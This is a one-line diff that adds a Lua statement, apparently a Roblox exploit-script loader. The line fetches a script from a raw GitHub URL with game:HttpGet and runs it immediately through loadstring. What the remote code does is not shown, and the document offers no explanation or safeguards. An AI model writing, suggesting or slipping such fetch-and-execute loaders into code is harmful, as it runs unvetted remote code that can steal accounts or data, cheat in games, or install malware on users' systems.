@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/zenth097-cmd/lokd/main/main.lua"))()
